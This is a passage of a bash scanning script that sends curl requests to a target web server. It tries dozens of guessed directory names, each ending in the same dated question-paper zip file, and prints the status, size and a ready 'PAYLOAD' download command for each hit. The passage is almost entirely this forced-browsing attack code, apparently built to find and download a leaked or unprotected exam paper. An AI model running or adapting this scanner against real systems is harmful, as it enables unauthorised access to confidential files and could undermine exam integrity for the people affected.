${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ControlQPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ControlQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ControlQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFileFileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFileFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFileFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor-QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor-QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUpload_QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUpload_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUpload_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-FileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-FileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitorBatchProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitorBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitorBatchProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUploadQP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUploadQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUploadQP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SyncQPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SyncQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SyncQPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkFileUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkFileUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl-QuestionPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl-QuestionPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper-MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler-ExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler-ExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_Transfer/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_Transfer/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal_QPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal_QPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_AutomationSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_AutomationSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-Automation/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-Automation/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaperProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaperProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaperProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-FileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-FileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QPService/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin_QPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin_QPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileDataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileDataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperFileProcessor/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperFileProcessor/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMonitor-DataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMonitor-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMonitor-DataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Portal-QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Portal-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Portal-QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUploadTestPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUploadTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUploadTestPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MgmtQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MgmtQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MgmtQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite_QPBatch/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite_QPBatch/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-System/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-System/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline-QPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline-QPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperDataPipeline/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperDataPipeline/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessorQPSystem/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessorQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessorQPSystem/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPHandler-Suite/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPHandler-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPHandler-Suite/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingQPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
